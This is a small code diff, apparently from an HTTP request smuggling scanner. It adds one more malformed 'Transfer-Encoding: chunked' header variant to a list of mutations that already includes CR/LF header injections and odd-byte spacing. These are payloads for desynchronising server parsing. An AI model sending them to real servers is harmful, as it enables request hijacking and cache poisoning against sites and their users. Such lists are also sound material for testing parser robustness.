@@ -43,6 +43,7 @@ mutations["accentTE"] = render_template("Transf\x82r-Encoding: chunked")
 mutations["x-rout"] = render_template("X:X\rTransfer-Encoding: chunked")
 mutations["x-nout"] = render_template("X:X\nTransfer-Encoding: chunked")
 mutations["x-nout"] = render_template("x:\nTransfer-Encoding: chunked")
+mutations["x-nout"] = render_template("Transfer-Encoding: chunked\r\n , chnuked-false")
 
 for i in [0x1,0x4,0x8,0x9,0xa,0xb,0xc,0xd,0x1F,0x20,0x7f,0xA0,0xFF]:
 	mutations["midspace-%02x"%i] = render_template("Transfer-Encoding:%cchunked"%(i))
